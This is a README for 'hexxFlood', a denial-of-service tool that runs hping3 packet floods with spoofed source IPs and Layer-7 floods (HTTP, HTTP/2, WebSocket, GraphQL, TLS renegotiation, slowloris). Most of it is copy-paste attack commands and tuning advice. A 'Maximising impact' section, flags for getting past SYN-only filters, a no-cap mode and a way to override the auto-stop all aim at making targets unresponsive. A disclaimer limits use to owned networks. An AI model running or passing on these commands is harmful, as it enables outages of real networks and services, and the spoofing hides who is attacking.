# 💀 hexxFlood - Ultimate Network Stress Testing Tool

[![Version](https://img.shields.io/badge/version-1.0-red.svg)](https://github.com/Cywarx/hexxFlood)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Kali](https://img.shields.io/badge/Kali-Linux-blue.svg)](https://www.kali.org/)
[![Bash](https://img.shields.io/badge/Bash-4.0+-green.svg)](https://www.gnu.org/software/bash/)

## ⚠️ DISCLAIMER

**THIS TOOL IS FOR EDUCATIONAL AND LEGITIMATE TESTING PURPOSES ONLY!**

- ✅ **ONLY** use on networks you **OWN** or have **EXPLICIT WRITTEN PERMISSION** to test
- ❌ Unauthorized use is **ILLEGAL** and can result in severe penalties
- 👮‍♂️ You are **SOLELY RESPONSIBLE** for your actions
- ⚖️ The author takes **NO responsibility** for misuse
- 🛡️ Use responsibly and ethically

> **DEMO NOTE:** For the live demonstration, run this **only** against your own
> lab/target machine on an **isolated network you control** (e.g. an air-gapped switch or
> a dedicated demo VLAN). Never point it at conference/venue infrastructure or any shared network.

---

## 🚀 Features

### Core Features
- ✅ **6 Attack Types** (SYN, UDP, ICMP, ACK, RST, FIN)
- ✅ **6 Attack Modes** (Low, Medium, High, Extreme, **Apocalypse**, **God**) + Custom
- ✅ **Core-scaling flood pool** — parallel `hping3 --flood` workers sized to your CPU cores (2× → 64×)
- ✅ **Smart Wi-Fi cap + escape hatch** — on Wi-Fi the worker count auto-caps to a sane peak (4× cores) by default; wired scales the full ladder. Remove all limits any time with `--no-cap` / `--unlimited`, or set your own with `--cap N`
- ✅ **Safe, restorable system tuning** (`--tune`) — bigger tx-queue + socket buffers + performance CPU governor, all **restored on exit**
- ✅ **Auto-stop for heavy modes** — `extreme`/`apocalypse`/`god` default to 60s unless you pass `-D`
- ✅ **Custom Port Selection** & **IP Spoofing**
- ✅ **Real-time Monitoring** — in-terminal live dashboard (pps bar, real NIC throughput, per-type hping3 breakdown, live command output) + optional `monitor.sh` windows
- ✅ **Automatic Cleanup** & **Configuration Persistence**

### Web & HTTP Features
- 🌐 **Web URL Support** (HTTP/HTTPS)
- 🔥 **HTTP Flood Attack** (no root required)
- 🧬 **Layer-7 protocol floods** — `http2`, `websocket`, `graphql`, `ssl_reneg`, `slowloris` (select via `-T`; auto-enabled by `extreme`/`apocalypse`/`god`)
- 🔄 **User-Agent Rotation**
- 📊 **Real-time Packet Counting**
- 📈 **Packets Per Second (PPS) Tracking**
- 🌊 **Bandwidth Estimation**
- 🎯 **Domain to IP Resolution**
- 🔒 **SSL/TLS Support**
- 📱 **Multi-threaded HTTP Requests**

### Requirements (installed automatically by `setup.sh`)
- **`hping3`** — raw packet engine for the SYN/UDP/ICMP/ACK/RST/FIN floods
- **`net-tools`, `ethtool`, `dnsutils`, `bc`, `sysstat`** — stats, tuning, URL resolution
- **Python venv** at `/opt/hexxFlood-venv` with **`scapy` `colorama` `requests` `h2` `websocket-client`** — these back the Layer-7 floods (`requests`→GraphQL, `h2`→HTTP/2, `websocket-client`→WebSocket). The tool prefers this venv, so the libraries must live there.

---

## 📦 Installation

### Quick Install (Recommended)

```bash
# Clone the repository
git clone https://github.com/Cywarx/hexxFlood.git
cd hexxFlood

# Run setup (installs hping3, python deps, etc.)
sudo ./setup.sh

# Verify installation
hexxFlood -h
```

### Updating

Pull the latest version straight from the tool — no need to re-clone:

```bash
hexxFlood --update        # or: hexxFlood -U
./quick.sh update         # same thing via the quick launcher
```

This runs a fast-forward `git pull` in the install directory and re-applies the
executable bit. If you have local edits that conflict, it tells you how to reset.

---

## 🧱 Project Structure

`hexxFlood.sh` is a **thin entrypoint** — it resolves its own location, sources
the engine modules from `lib/`, then parses arguments and runs. All the real
logic lives in `lib/`, split by responsibility so the tool stays readable and
easy to extend without touching the launcher.

```
hexxFlood/
├── hexxFlood.sh        # entrypoint: module loader + arg parsing + banner/help + main()
├── lib/
│   ├── config.sh       # colors, version, and every default / state variable
│   ├── utils.sh        # NIC counters, CPU/mem sampling, formatting, logging,
│   │                   #   URL resolution, and the git self-update machinery
│   ├── system.sh       # reversible host tuning, GOD MODE kernel limits, root elevation
│   ├── attacks.sh      # hping3 SYN/UDP/ICMP/ACK/RST/FIN launchers, the launcher
│   │                   #   that runs the payloads/ scripts, worker scaling, mode presets
│   └── dashboard.sh    # live in-terminal dashboard, end-of-run report, cleanup/teardown
├── payloads/           # the Layer-7 flood scripts, executed by lib/attacks.sh
│   ├── http_flood.py       # HTTP/1.1 request flood (no root needed)
│   ├── http2_flood.py      # HTTP/2 stream flood        (needs python 'h2')
│   ├── websocket_flood.py  # WebSocket flood            (needs 'websocket-client')
│   ├── graphql_flood.py    # GraphQL query/mutation flood (needs 'requests')
│   ├── ssl_reneg.py        # TLS renegotiation attack
│   └── slowloris.py        # Slowloris slow-header attack
├── monitor.sh          # standalone external monitor window (ping/network/system/full/log)
│                       #   — a separate program, run in its own terminal; not lib/dashboard.sh
├── quick.sh            # convenience launcher / update shortcut
├── setup.sh            # installer: deps + wrapper + sudoers + shell completion
└── README.md
```

> **Important:** the `lib/` and `payloads/` directories must always travel with
> `hexxFlood.sh`. `setup.sh`, `hexxFlood -U`, and the internal deploy step all copy
> them automatically — but if you `scp`/copy the tool by hand, copy the whole folder,
> not just `hexxFlood.sh`. Running the entrypoint without its modules aborts with
> a clear `FATAL: missing module …` message rather than misbehaving.

Every command-line flag, attack mode, and behaviour documented below is
unchanged by this layout — it is purely an internal reorganisation.

---

## 🎮 Usage

```bash
sudo ./hexxFlood.sh [OPTIONS]
```

### 🔐 Root / privileges

The raw-packet engine (`hping3`) and system tuning **require root**. If you launch
hexxFlood **without** root, it asks at startup:

```
🔐 hexxFlood's raw-packet engine (hping3) and system tuning need ROOT.
Run as root now? [Y/n]:
```

- **`Y` (default)** — re-launches itself via `sudo` (one password prompt) and runs at full power.
- **`n`** — keeps running unprivileged: only the **HTTP/URL flood** works; raw-packet
  floods and tuning are disabled. (If the attack is raw-packet only, it explains this and exits.)

Run it with `sudo ./hexxFlood.sh …` up front to skip the prompt entirely.

To skip the prompt **without** launching under sudo, set `AUTO_ROOT` — as an env var
or in `~/.hexxFlood_config`:

```bash
AUTO_ROOT=yes ./hexxFlood.sh -t 192.168.1.14 -m high   # auto-elevate (one password prompt)
AUTO_ROOT=no  ./hexxFlood.sh -u http://example.com -T http   # stay unprivileged (HTTP only)
```

An `AUTO_ROOT` passed in the environment overrides the value saved in the config file.

### Options

| Option | Description |
|--------|-------------|
| `-t, --target IP`       | Target IP address |
| `-u, --url URL`         | Target Web URL (`http://example.com`) |
| `-p, --threads NUM`     | HTTP worker threads (default: 50; a mode preset overrides this) |
| `-s, --size BYTES`      | Packet size (64-65495, default: 65495) |
| `-d, --delay MS`        | Delay (`u1`, `u10`, `u100`, default: `u1`) |
| `-i, --interface IFACE` | Network interface (default: `wlan0`) |
| `-m, --mode MODE`       | Mode: `low` \| `medium` \| `high` \| `extreme` \| `apocalypse` \| `god` \| `custom` |
| `-P, --ports PORTS`     | Comma-separated dst ports — floods **each** port (e.g. `80,443,22`) |
| `-T, --type TYPES`      | Types: `syn,udp,icmp,ack,rst,fin,http,http2,websocket,graphql,ssl_reneg,slowloris,all` |
| `-D, --duration SEC`    | Duration in seconds (0 = infinite). `extreme`/`apocalypse`/`god` default to `60` unless set |
| `--no-spoof`            | Disable source-IP spoofing (drops `--rand-source`) |
| `--fixed-ports`         | Use a static dst port instead of an incrementing one |
| `--tune`                | Force safe system tuning on (tx-queue, socket buffers, `performance` governor — **restored on exit**) |
| `--no-tune`             | Never touch system settings |
| `--tx-queue NUM`        | NIC tx queue length while flooding (default: `10000`) |
| `--no-cap`, `--unlimited` | Remove **all** worker caps → full power (no limit), incl. on Wi-Fi |
| `--cap NUM`             | Set an explicit worker ceiling on any interface (e.g. `--cap 64`) |
| `-U, --update`          | Update hexxFlood to the latest version (`git pull`) |
| `-V, --version`         | Show version and exit |
| `-h, --help`            | Show help |

### Attack Modes

Each mode runs a pool of parallel `hping3 --flood` workers sized to your CPU cores.
The pool is round-robined across the selected attack types. **Throughput scales with CPU
cores, not process count** — one `--flood` worker already saturates a core, so the pool is
sized in multiples of `nproc` rather than spawning hundreds of thrashing processes.

Two numbers scale per mode: **flood workers** = parallel `hping3` processes
(scale with CPU cores), and **threads** = HTTP/Layer-7 concurrency (the `-p`
value). A mode sets both; `custom` keeps your `-p`/config value instead.

| Mode | Flood workers | Threads (`-p`) | Attack Types | Tuning | Auto-stop |
|------|---------------|----------------|--------------|--------|-----------|
| `low`        | 2× cores  | 10   | syn, udp, icmp | off | ∞ |
| `medium`     | 4× cores  | 25   | syn, udp, icmp, ack | off | ∞ |
| `high`       | 8× cores  | 50   | syn, udp, icmp, ack, rst, fin | on | ∞ |
| `extreme`    | **16× cores** | 100  | all + http2/ws/graphql | on | **60s** |
| `apocalypse` | **32× cores** | 500  | all + full Layer-7 | on | **60s** |
| `god`        | **64× cores** | 1000 | everything + kernel limits | on | **60s** |
| `custom`     | 8× cores  | 50*  | your own `-P / -T` values | auto | ∞ |

<sub>*`custom` uses your `-p` value (or the config default 50); every other mode forces its own thread count.</sub>

> **Wi-Fi auto-cap (default) — with a full-power escape hatch.** On a **Wi-Fi** interface the
> auto worker count is capped to **~4× cores** by default. A wireless link is shared and
> half-duplex with a small driver queue, so this cap keeps throughput at its sweet spot on
> Wi-Fi. **Wired interfaces are never auto-capped** and scale the full ladder (64/128/256…).
>
> Want **no limit** (e.g. to push the target's latency into the hundreds/thousands of ms)?
> Remove all caps with **`--no-cap`** (alias `--unlimited`):
> ```bash
> sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme --no-cap
> ```

> **Set your own ceiling:** `--cap N` (or `WIFI_WORKER_CAP=N`) applies an explicit worker
> ceiling on **any** interface — e.g. `--cap 64`.

> **Exact count:** `HEXXFLOOD_WORKERS=N` forces an exact, uncapped worker count (bypasses the
> mode sizing *and* the Wi-Fi cap), e.g.
> `sudo HEXXFLOOD_WORKERS=2000 ./hexxFlood.sh -t 192.168.1.14 -m extreme`.

> **Maximising impact (read this):**
> - **On Wi-Fi, use `--no-cap` when you want maximum pressure.** The default 4× cores cap is
>   the safe Wi-Fi sweet spot; to drive the target's latency into the hundreds/thousands of ms,
>   add `--no-cap` (or force a big count like `HEXXFLOOD_WORKERS=500` / `2000`). On **wired**
>   NICs there's no cap to begin with — just pick a heavy mode.
> - **Packet size is the other big lever.** The default `-s 65495` maxes *bandwidth* but sends
>   few packets/sec. For **maximum packets/sec** (overwhelms a host's CPU/interrupts), use a
>   small size: `sudo ./hexxFlood.sh -t <ip> -m extreme -s 120`.
> - **Use ethernet, not Wi-Fi, for raw throughput.** Wired NICs handle high-rate raw/spoofed
>   injection far better and let the heavy modes scale — orders of magnitude more real traffic.
> - **Measure impact from a *third* device**, not the attacker — a `ping` on the attacking
>   host reads high mostly because its own CPU is busy, not because the target is worse off.

### Examples — every flag, what it does, and when to use it

Below is a complete, copy-paste catalogue. Each block shows the flag **in a real
command**, explains **what it does**, and tells you **when you'd reach for it**.

#### 🎯 Choosing the target — `-t` / `-u`

```bash
# -t, --target : attack a raw IP (Layer 3/4 flood via hping3). Use for any host,
#                router, printer, IoT box — anything with an IP on your lab net.
sudo ./hexxFlood.sh -t 192.168.1.14 -m high

# -u, --url : attack a website by URL. Auto-resolves the domain to an IP, picks
#             port 80 (http) / 443 (https), and runs the HTTP flood. Use when the
#             target is a web app/server rather than a bare host.
sudo ./hexxFlood.sh -u http://example.com -T http

# URL with an explicit port (e.g. an app on :8080). Use when the site isn't on 80/443.
sudo ./hexxFlood.sh -u http://example.com:8080 -T http -m high
```

#### 🔥 Picking the intensity — `-m` (mode)

```bash
# -m low : 2× cores, syn/udp/icmp, no tuning, runs forever. Use for a gentle
#          smoke test / confirming the tool works without hammering anything.
sudo ./hexxFlood.sh -t 192.168.1.14 -m low

# -m medium : 4× cores, adds ack. A moderate load — use to see early impact.
sudo ./hexxFlood.sh -t 192.168.1.14 -m medium

# -m high : 8× cores, ALL six TCP/UDP/ICMP types + system tuning. The everyday
#           "really stress it" mode; runs until you stop it. Best default for demos.
sudo ./hexxFlood.sh -t 192.168.1.14 -m high

# -m extreme : 16× cores, all types, tuning on, AUTO-STOPS after 60s. Use for a
#              short, hard burst when you want maximum pressure but a safe auto-cutoff.
sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme

# -m apocalypse : 32× cores, full Layer-7 stack + tuning, auto-stops after 60s.
#                 Use only on wired lab gear you fully control.
sudo ./hexxFlood.sh -t 192.168.1.14 -m apocalypse

# -m god : 64× cores, EVERYTHING + kernel-level limits (rmem/wmem/backlog),
#          tuning on, auto-stops after 60s. The absolute maximum preset.
sudo ./hexxFlood.sh -t 192.168.1.14 -m god

# -m custom : ignore the presets and drive it yourself with -T / -P / -p / -s.
#             Use when you want exact control over types, ports and packet size.
sudo ./hexxFlood.sh -t 192.168.1.14 -m custom -T syn,udp -P 80,53 -s 120
```

#### 🧨 Selecting attack types — `-T`

```bash
# -T syn : TCP SYN flood (half-open connections). Use against TCP services/ports
#          to exhaust connection tables — the classic, most visual flood.
sudo ./hexxFlood.sh -t 192.168.1.14 -T syn

# -T udp : UDP flood. Use against UDP services (DNS :53, game servers, VoIP).
sudo ./hexxFlood.sh -t 192.168.1.14 -T udp -P 53

# -T icmp : ICMP (ping) flood. Use to saturate a host's ICMP handling / bandwidth.
sudo ./hexxFlood.sh -t 192.168.1.14 -T icmp

# -T ack,rst,fin : other TCP flag floods. Use to slip past filters that only watch
#                  for SYN, or to stress a stateful firewall's connection tracking.
sudo ./hexxFlood.sh -t 192.168.1.14 -T ack,rst,fin

# -T all : every packet type at once (syn,udp,icmp,ack,rst,fin). Maximum variety —
#          use when you don't care which vector lands, you just want everything.
sudo ./hexxFlood.sh -t 192.168.1.14 -T all -m high

# -T http : HTTP request flood (Layer 7). Use against web apps to exhaust worker
#           threads/CPU rather than raw bandwidth. Pairs with -u and -p.
sudo ./hexxFlood.sh -u http://192.168.1.14 -T http -p 100
```

#### 🔌 Ports & packet shape — `-P`, `-p`, `-s`, `-d`

```bash
# -P, --ports : comma-separated destination ports — floods EACH one at once.
#               Use to hit several services simultaneously (web + ssh + https).
sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -P 80,443,22

# -p, --threads : HTTP worker-thread count (default 50; a mode preset overrides it). Drives the HTTP flood.s
#                 concurrency; raise it to push a web app harder.
sudo ./hexxFlood.sh -u http://192.168.1.14 -T http -p 150

# -s, --size : packet size in bytes (64-65495). BIG size (default 65495) = max
#              BANDWIDTH; SMALL size = max PACKETS/sec to overwhelm a host's CPU.
sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme -s 120     # max pps
sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme -s 65495   # max bandwidth (default)

# -d, --delay : inter-packet delay hint (u1/u10/u100 microseconds). Lower = faster.
#               (Note: --flood mode already sends as fast as possible; use for
#               deliberately throttled, quieter tests.)
sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -d u100
```

#### ⏱️ Duration — `-D`

```bash
# -D SEC : run for N seconds then auto-stop. Use to bound a test / avoid babysitting.
sudo ./hexxFlood.sh -t 192.168.1.14 -m high -D 60

# -D 0 : run forever (until Ctrl+C). Also OVERRIDES the 60s auto-stop of
#        extreme/apocalypse — use when you explicitly want those modes to run open-ended.
sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme -D 0
```

#### 🕵️ Source spoofing & port pattern — `--no-spoof`, `--fixed-ports`

```bash
# (default) spoofs a random source IP (--rand-source) and increments the dst port.

# --no-spoof : send from your REAL source IP. Use when the target must see your
#              real address (e.g. you're testing rate-limiting/geo-blocking on your
#              own IP, or spoofing is dropped by the network).
sudo ./hexxFlood.sh -t 192.168.1.14 -T syn --no-spoof

# --fixed-ports : hammer a single static dst port instead of incrementing. Use to
#                 concentrate all pressure on one service/port.
sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -P 80 --fixed-ports

# Both together — real IP, one fixed port (most "honest"/traceable configuration).
sudo ./hexxFlood.sh -t 192.168.1.14 -T syn --no-spoof --fixed-ports
```

#### ⚙️ Performance tuning — `--tune`, `--no-tune`, `--tx-queue`

```bash
# --tune : force SAFE, restorable tuning ON (bigger NIC tx-queue + socket buffers +
#          performance CPU governor). Use to squeeze out max throughput on modes
#          where tuning is off by default (low/medium/custom). Restored on exit.
sudo ./hexxFlood.sh -t 192.168.1.14 -m medium --tune

# --no-tune : never touch system settings. Use on production-ish boxes or when you
#             don't want the governor/buffers changed even for a heavy mode.
sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme --no-tune

# --tx-queue NUM : set the NIC tx queue length while flooding (default 10000). Raise
#                  it if you see ENOBUFS/drops at very high packet rates on wired NICs.
sudo ./hexxFlood.sh -t 192.168.1.14 -m high --tx-queue 20000
```

#### 🧵 Worker-count caps & overrides — `--no-cap`, `--cap`, `HEXXFLOOD_WORKERS`

```bash
# (default) On Wi-Fi the worker count auto-caps to 4× cores — the safe sweet spot.
#           On wired interfaces there is no cap. Nothing to pass for this.
sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme -i wlan0

# --no-cap / --unlimited : remove ALL caps, including the Wi-Fi one. Full power.
#                          Use when you want maximum pressure on a wireless link.
sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme -i wlan0 --no-cap

# --cap N : set your own worker ceiling on ANY interface (overrides the Wi-Fi default).
sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme --cap 64

# HEXXFLOOD_WORKERS=N : force an EXACT worker count (e.g. 500, 2000), never capped.
#                       Bypasses the mode sizing AND the Wi-Fi cap.
sudo HEXXFLOOD_WORKERS=2000 ./hexxFlood.sh -t 192.168.1.14 -m extreme
```

#### 🔐 Privileges — `sudo`, `AUTO_ROOT`

```bash
# Launch directly as root (no prompt) — the simplest full-power run.
sudo ./hexxFlood.sh -t 192.168.1.14 -m high

# Not root? The tool asks "Run as root? [Y/n]". Skip that prompt with AUTO_ROOT:

# AUTO_ROOT=yes : auto-elevate via sudo (one password prompt). Use in scripts/aliases.
AUTO_ROOT=yes ./hexxFlood.sh -t 192.168.1.14 -m high

# AUTO_ROOT=no : stay unprivileged — HTTP/URL flood only, no raw packets/tuning.
#                Use when you deliberately only want the Layer-7 HTTP flood.
AUTO_ROOT=no ./hexxFlood.sh -u http://example.com -T http -p 100
```

#### 🖥️ Interface & monitoring — `-i`, `--monitor`, `--auto-monitor`, `--no-monitor`

```bash
# -i, --interface : pick the NIC to flood from / read stats on (default wlan0).
#                   Use eth0/enp3s0 for wired (far higher real throughput than Wi-Fi).
sudo ./hexxFlood.sh -t 192.168.1.14 -m high -i eth0

# --monitor : open the live monitor ONLY (no attack). Use to watch a target's health.
hexxFlood --monitor -t 192.168.1.14

# --monitor-mode : which monitor view for --monitor (ping|network|system|full|log).
hexxFlood --monitor --monitor-mode ping -t 192.168.1.14

# --auto-monitor MODES : attack AND auto-open monitor window(s), one per mode.
#                        Use for a side-by-side attack+impact demo.
sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme --auto-monitor full,ping,system

# --no-monitor : attack only, no pop-up windows (stay in the current terminal).
#                Use on headless/SSH boxes or when you just want the inline dashboard.
sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme --no-monitor
```

#### 🛠️ Utility — `-U`, `-V`, `-h`

```bash
hexxFlood -U    # --update  : fast-forward git pull to the latest version
hexxFlood -V    # --version : print version and exit
hexxFlood -h    # --help    : show the built-in usage guide
```

#### 🧩 Putting it together — common recipes

```bash
# Classic SYN-flood demo on a lab host, 2 minutes, with a monitor window.
sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -m high -D 120 --auto-monitor full

# Max packets/sec CPU-crushing burst on wired NIC (small packets), 60s auto-stop.
sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme -i eth0 -s 120

# Layer-7 only, no root needed, hammer a web app with 150 HTTP workers.
AUTO_ROOT=no ./hexxFlood.sh -u https://192.168.1.14 -T http -p 150

# Fully manual: UDP+SYN on DNS+web ports, real source IP, fixed ports, 90s.
sudo ./hexxFlood.sh -t 192.168.1.14 -m custom -T syn,udp -P 80,53 --no-spoof --fixed-ports -D 90
```

### Live attack output (in-terminal dashboard)

While an attack runs, `hexxFlood.sh` shows a **live dashboard** that refreshes in place
(~1s) — a live packets-per-second bar, **real NIC throughput**, a per-attack-type `hping3`
process breakdown, the actual `hping3` banner, and a **rolling panel of real command output**
(live `ping` replies) so you can confirm the attack is truly landing:

```text
☢️  hexxFlood LIVE  18:31:05   ⚡ SENDING
────────────────────────────────────────────────────────────────
🎯 Target : 192.168.1.14
⚙️  Config : iface wlan0  mode high  types syn,udp,icmp,ack,rst,fin  pkt 65495B
⏱️  Time   : 42s  (∞)
────────────────────────────────────────────────────────────────
📦 Packets: 1,234,567 sent
⚡ Live   : 48,210 pps  [████████████████████████████░░░░]
📈 Avg    : 29,394 pps      🌐 TX: 2.10 Gbps
🩺 Target : time=1.24 ms      🔌 Est.conn: 312
🖥️  Host   : cpu 64%  mem 3.7/23.3G
────────────────────────────────────────────────────────────────
🧨 hping3 : 151 procs  →  syn:50 udp:50 icmp:1 ack:50 rst:0 fin:0   http: 0
   ┗ HPING 192.168.1.14 (wlan0): S set, 40 headers + 65495 data bytes, hping in flood mode
────────────────────────────────────────────────────────────────
📜 Live command output
   ✓ 18:31:04 64 bytes from 192.168.1.14: icmp_seq=1 ttl=64 time=1.24 ms
   ✗ 18:31:05 ping 192.168.1.14: request timed out
────────────────────────────────────────────────────────────────
Press Ctrl+C to stop
```

- **`⚡ SENDING` / `·· IDLE`** — green only when packets are actively climbing *and* flood
  processes are alive, so it's obvious at a glance the attack is working.
- **Live pps + bar** is the instantaneous rate (delta since the last tick), not a lifetime
  average; **TX** is the interface's real byte-rate straight from `/sys` (not an estimate).
- The monitor reads counters from `/sys` and `/proc` (no per-tick `top`/`ifconfig` forks), so
  it costs almost nothing and **never steals throughput from the flood**.

Press **`Ctrl+C`** (or let `-D` elapse) to stop — the terminal is restored cleanly and a
structured **final summary** (total packets, total time, average PPS) is printed at the end,
with rules that adapt to your terminal width so it stays tidy on small screens:

```text
════════════════════════════════════════════════════════════════
   🛑  hexxFlood — Attack Stopped
════════════════════════════════════════════════════════════════

   ✔  hping3 flood processes terminated
   ✔  HTTP flood terminated
   ✔  Temporary files removed
   ✔  System settings restored

   📊 Final Statistics
      Total Packets Sent : 32,418
      Total Attack Time  : 36s
      Average PPS        : 900
────────────────────────────────────────────────────────────────
   ✅ Cleanup complete.  Stay ethical. 👋
────────────────────────────────────────────────────────────────
```

> For a richer, real-time **dashboard** view (throughput graphs, system panel), run the
> dedicated `monitor.sh` in a second pane — see [Monitoring the Attack](#-monitoring-the-attack-live-demo) below.

### Quick Launcher (`quick.sh`)

Preset one-liners for common scenarios:

```bash
./quick.sh local             # extreme attack on default lab target
./quick.sh local-high        # high-mode attack on default lab target
./quick.sh local-nuke        # apocalypse (60s, max overdrive) on default lab target
./quick.sh local-test        # low 30s smoke test
./quick.sh web http://target # extreme web flood
./quick.sh lab 10.0.0.5      # high-mode attack on ports 80,443,22
./quick.sh custom            # interactive prompts
./quick.sh status            # is anything running?
./quick.sh stop              # kill all attacks
```

---

## 📊 Monitoring the Attack (Live Demo)

The repo ships a dedicated **`monitor.sh`** script so you can *demonstrate the impact* of the
attack in real time — perfect for a side-by-side split screen during the talk:
**left pane = attack (`hexxFlood.sh`), right pane = monitor (`monitor.sh`).**

### Zero-effort monitoring — built into `hexxFlood`

You no longer need to open the monitor by hand. It is wired straight into the main tool:

```bash
# Watch a target only (no attack) — same as running monitor.sh
hexxFlood --monitor -t 192.168.1.14
hexxFlood --monitor --monitor-mode ping -t 192.168.1.14

# Launch an attack: a monitor terminal opens AUTOMATICALLY
hexxFlood -t 192.168.1.14 -m extreme

# Open several monitor windows at once (one per mode)
hexxFlood -t 192.168.1.14 -m extreme --auto-monitor full,ping,system

# Don't auto-open anything (attack only, current terminal)
hexxFlood -t 192.168.1.14 -m extreme --no-monitor
```

| Option | Description |
|--------|-------------|
| `--monitor`            | Open the live monitor only, no attack (uses `-t`/`-i`) |
| `--monitor-mode MODE`  | Mode for `--monitor`: `ping`\|`network`\|`system`\|`full`\|`log` (default `full`) |
| `--auto-monitor [MODES]` | Auto-open monitor window(s) when an attack starts. `MODES` is comma-separated → one window each. **On by default** (`full`) |
| `--no-monitor`         | Do not auto-open any monitor window |

The auto-opened windows launch in whatever terminal emulator you have
(`xterm`, `gnome-terminal`, `konsole`, `xfce4-terminal`, `qterminal`, `kitty`,
`alacritty`, `tilix`, …) and run as your normal user even though the attack runs under `sudo`.

> **Headless / SSH boxes:** if no graphical display is available, the monitor windows are
> simply skipped with a notice — **the attack still runs at full power in your single terminal**.
> Open a monitor by hand in another SSH session with `hexxFlood --monitor -t <ip>` if you want one.

### Recommended demo layout

```
┌───────────────────────────────┬───────────────────────────────┐
│  ATTACKER PANE                 │  MONITOR PANE                  │
│  sudo ./hexxFlood.sh \         │  ./monitor.sh \                │
│    -t 192.168.1.14 -T syn \    │    -t 192.168.1.14 \           │
│    -m high -D 120              │    -i wlan0 -m full            │
└───────────────────────────────┴───────────────────────────────┘
```

Use `tmux` (or two terminals) to show both at once:

```bash
tmux new-session -d -s demo
tmux split-window -h
tmux send-keys -t demo:0.0 'sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -m high -D 120' C-m
tmux send-keys -t demo:0.1 './monitor.sh -t 192.168.1.14 -i wlan0 -m full' C-m
tmux attach -t demo
```

### Monitor usage

```bash
./monitor.sh [OPTIONS]
```

| Option | Description |
|--------|-------------|
| `-t, --target IP`       | Target IP to monitor (default: `192.168.1.14`) |
| `-i, --interface IFACE` | Network interface (default: `wlan0`) |
| `-m, --mode MODE`       | `ping` \| `network` \| `system` \| `full` \| `log` |
| `-r, --refresh SEC`     | Update interval in seconds (default: `1`, accepts decimals like `0.5`) |
| `-h, --help`            | Show help |

> **Real-time, flicker-free display.** The monitor draws its layout (banner, labels, borders)
> **once**, then updates *only the changing values* in place each cycle — so the numbers tick
> live like a proper dashboard, with **no screen repaint/refresh**. Lower the interval for a
> snappier view, e.g. `./monitor.sh -m full -r 0.5` updates twice a second.
>
> - 🖥️ **Small-terminal safe** — line-wrapping is disabled and the frame never scrolls, so it
>   won't fluctuate/jitter on narrow or short windows. In `full` mode the banner is auto-hidden
>   on short terminals so the stats stay visible.
> - 🔁 **Resize-aware** — the layout repaints automatically when you resize the terminal.
> - ↩️ Your shell (cursor + line-wrap) is always restored cleanly on `Ctrl+C`/exit.
>
> ⚠️ In `ping`/`full` modes an *unresponsive* target makes each ping wait up to 1s for its own
> timeout, so updates pace at ~1s there; against a live target the refresh runs at your full
> `--refresh` rate. `network`/`system` modes always update at the full rate.

### Monitor modes — what each one *shows the audience*

| Mode | What it demonstrates | Command |
|------|----------------------|---------|
| **`ping`**    | Target latency spiking / **going unresponsive** — the clearest "it's down" signal | `./monitor.sh -t 192.168.1.14 -m ping` |
| **`network`** | **Live RX/TX throughput (B/s→KB/s→MB/s)** plus TX/RX packet counters, active connections, live `hping3` process count | `./monitor.sh -i wlan0 -m network` |
| **`system`**  | CPU/RAM/load spiking + top attack processes on the *attacker* box | `./monitor.sh -m system` |
| **`full`**    | **All of the above on one dashboard** — the go-to view for the live demo | `./monitor.sh -t 192.168.1.14 -i wlan0 -m full` |
| **`log`**     | Timestamps everything to `hexxFlood_monitor_<date>.log` for post-demo evidence | `./monitor.sh -t 192.168.1.14 -m log` |

### Step-by-step: demonstrating the DoS live

1. **Baseline first (before attacking).** Start the monitor and let the audience see a
   *healthy* target — low ping (`time=X ms`), flat packet counters, normal CPU:
   ```bash
   ./monitor.sh -t 192.168.1.14 -i wlan0 -m full
   ```
2. **Launch the attack** in the second pane:
   ```bash
   sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -m high -D 120
   ```
3. **Watch the impact** on the monitor pane:
   - Ping latency climbs, then flips to **`💀 TARGET UNRESPONSIVE!`**
   - **`RX Rate` / `TX Rate`** shoot up in real time (KB/s → MB/s), and `TX packets` / `RX packets` counters race upward
   - `hping3 Processes` and `Active Connections` jump
   - Attacker CPU / Load Average spike
4. **Stop the attack** — either wait for `-D` duration to elapse, or `Ctrl+C` the attacker pane.
5. **Show recovery** — ping returns to normal, proving the target was only down *during* the attack.
6. **(Optional) Keep evidence** — run a parallel `log` monitor so you have a timestamped file
   to reference in Q&A:
   ```bash
   ./monitor.sh -t 192.168.1.14 -m log
   ```

### Verifying impact with standard tools (backup / cross-check)

If you want additional, non-custom tooling on screen for credibility:

```bash
# Continuous latency graph
ping 192.168.1.14

# Live per-second interface throughput
sudo iftop -i wlan0                 # or: sudo nload wlan0

# Live packet capture proving the flood
sudo tcpdump -i wlan0 host 192.168.1.14 -nn

# Watch connection/socket counts climb
watch -n1 'ss -s'
```

> **Tip:** For SYN floods, run `tcpdump` on the **target** to show a storm of half-open
> `[S]` packets with spoofed source IPs — very visual for an audience.

---

## 🧹 Cleanup

`hexxFlood.sh` cleans up its own child processes on exit. If anything is left running:

```bash
sudo pkill hping3
sudo pkill -f http_flood.py
```

---

## 📄 License

Released under the [MIT License](LICENSE).
